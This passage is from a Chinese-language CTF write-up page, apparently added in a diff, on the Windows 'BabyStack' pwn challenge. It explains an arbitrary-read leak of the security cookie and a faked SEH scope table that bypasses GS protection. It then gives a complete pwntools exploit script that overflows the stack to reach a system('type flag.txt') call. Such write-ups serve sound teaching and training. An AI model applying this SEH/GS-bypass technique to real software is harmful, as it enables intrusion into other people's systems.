+        <span class="n">v7</span> <span class="o">=</span> <span class="n">v23</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="p">(</span><span class="n">v7</span> <span class="o">-</span> <span class="mh">0x3</span><span class="p">);</span>
+        <span class="n">v30</span> <span class="o">=</span> <span class="n">v7</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+
+<p>可以看出，实际上是把输入的字符串转换为16进制数，存在v30中，然后被传入esi。需要注意的是输入的字母必须为大写。因此，输入00D78551即可，其中0用来占位，以达到8位。</p>
+<p>此时，我们触发了SEH，进入异常处理函数，通过结构体可以看到，进入了另一个特定的函数</p>
+<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Windows/BabyStack/index_files/1571934778094.png" /></p>
+<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Windows/BabyStack/index_files/1571934808588.png" /></p>
+<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Windows/BabyStack/index_files/1571933918001.png" /></p>
+<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Windows/BabyStack/index_files/1571934152660.png" /></p>
+<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Windows/BabyStack/index_files/1571934613659.png" /></p>
+<p>可以看到，这个函数中，在一个10次的循环中，可以任意地址读。而另一个函数，第三个参数存储在栈上，第四个参数为0x100，猜测有可能会导致栈溢出。因此，我们可以考虑是否能栈溢出覆盖返回地址，从而getshell。或者，我们也可以考虑通过读非法地址或者栈溢出而再次触发异常。而此处我们可以任意地址读，因此我们可以考虑伪造一个SEH块。因此，我们先查找看看是否有system函数可以调用。</p>
+<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Windows/BabyStack/index_files/1571935158815.png" /></p>
+<p>找到一个直接call system的地址，跳进去看，发现还是在之前那个函数中，但是未被反编译，直接通过call system执行type flag.txt。如果我们能控制程序跳到这个地方，则可以直接拿到flag。</p>
+<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Windows/BabyStack/index_files/1571935195128.png" /></p>
+<p>而这个位置可以通过和指向main函数的指针的地址的偏移来计算</p>
+<p>因此可以通过
+$$
+*MAINaddress+8266-3963 = *MAINaddress + 4903
+$$
+来跳转到获取flag指令的地址。</p>
+<p>那么如何触发任意地址读和触发栈的函数？</p>
+<p>任意地址读只是通过strcmp判断，因此只要输入yes即可。</p>
+<p>栈的函数则需要通过双层if，只要输入不为yes，不为no的任意字符串即可。</p>
+<p>下一步即可以开始构造SEH块了，先想办法读取上一个SEH块。可以从main函数中看到，上一个SEH块信息存入栈中时与一个___security_cookie做了异或，因此通过指向main函数的指针的地址加上偏移值获取该cookie.</p>
+<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Windows/BabyStack/index_files/1571937817439.png" /></p>
+<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Windows/BabyStack/index_files/1571937941989.png" /></p>
+<p>由此可知，
+$$
+cookie = *MAINaddress - 03963 + 7c004 = *MAINaddress + 786a1
+$$
+因此，我们可以通过这个值伪造GS，从而绕过GS。</p>
+<p>而栈上值的地址可以通过栈基址加偏移获取。</p>
+<p>在栈上伪造SEH、GS之后，就可以通过栈溢出或者读非法地址来触发SEH了。因为再次构造栈溢出怕会覆盖之前构造的SEH，因此直接触发任意地址读写，然后输入任一字符就可以了。</p>
+<h2 id="exp">EXP<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h2>
+<p>由于比赛服务器关闭，因此通过windows配置开放SSH给ubuntu，进行测试。</p>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;debug&quot;</span>
+<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&quot;192.168.43.254&quot;</span><span class="p">,</span><span class="mi">22</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;BabyStack.exe&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;stack address = &quot;</span><span class="p">)</span>
+<span class="n">stack_addr</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;main address = &quot;</span><span class="p">)</span>
+<span class="n">main_addr</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">I_know</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">main_addr</span><span class="o">+</span><span class="mh">0x4BF3</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">&quot;0&quot;</span><span class="p">)</span>
+<span class="c1">#print hex(stack_addr),hex(main_addr)</span>
+
+<span class="n">stack1</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mh">0x3C</span>
+<span class="n">stack2</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mh">0x38</span>
+<span class="n">stack3</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mh">0x34</span>
+<span class="n">stack4</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mh">0x30</span>
+<span class="n">shell</span> <span class="o">=</span> <span class="n">main_addr</span> <span class="o">+</span> <span class="mh">0x4903</span>
+<span class="n">SEH_scope_table</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xFFFFFFE4</span><span class="p">)</span>
+<span class="n">SEH_scope_table</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">SEH_scope_table</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xFFFFFFC0</span><span class="p">)</span>
+<span class="n">SEH_scope_table</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">SEH_scope_table</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xFFFFFFFE</span><span class="p">)</span>
+<span class="n">SEH_scope_table</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>
+<span class="n">SEH_scope_table</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>
+<span class="n">cookie_addr</span> <span class="o">=</span> <span class="n">main_addr</span> <span class="o">+</span> <span class="mh">0x786A1</span>
+<span class="n">GS_addr</span><span class="o">=</span><span class="n">stack_addr</span> <span class="o">-</span> <span class="mh">0x18</span>
+
+<span class="c1">#pause()</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;So,Can You Tell me what did you know?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">I_know</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Do you want to know more?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;yes&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Where do you want to know?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">cookie_addr</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;is &quot;</span><span class="p">)</span>
+<span class="n">cookie</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+<span class="c1">#print hex(cookie)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Do you want to know more?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;yes&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Where do you want to know?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">stack1</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;is &quot;</span><span class="p">)</span>
+<span class="n">stack11</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+<span class="c1">#print hex(stack11)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Do you want to know more?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;yes&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Where do you want to know?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">stack2</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;is &quot;</span><span class="p">)</span>
+<span class="n">stack22</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+<span class="c1">#print hex(stack22)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Do you want to know more?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;yes&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Where do you want to know?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">stack3</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;is &quot;</span><span class="p">)</span>
+<span class="n">stack33</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+<span class="c1">#print hex(stack33)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Do you want to know more?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;yes&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Where do you want to know?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">stack4</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;is &quot;</span><span class="p">)</span>
+<span class="n">stack44</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+<span class="c1">#print hex(stack44)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">4</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">SEH_scope_table</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">112</span>
+<span class="c1">#payload = &quot;A&quot; * 4</span>
+<span class="c1">#payload = &quot;A&quot; * 4</span>
+<span class="c1">#payload = &quot;A&quot; * 4</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">stack11</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">stack22</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">stack33</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">stack44</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="o">+</span><span class="mh">0x1019A30</span><span class="o">-</span><span class="mh">0x101395E</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">cookie</span><span class="o">^</span><span class="n">GS_addr</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="c1">#pause()</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Where do you want to know?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;aaa&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Do you want to know more?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;yes&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Where do you want to know?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;aaa&quot;</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../../VMEscape/scvm/" title="scvm" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                scvm
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../../../crypto/" title="home" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                home
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; f61d team
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/application.ac79c3b0.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../../.."}})</script>
+      
+    
+  </body>
+</html>
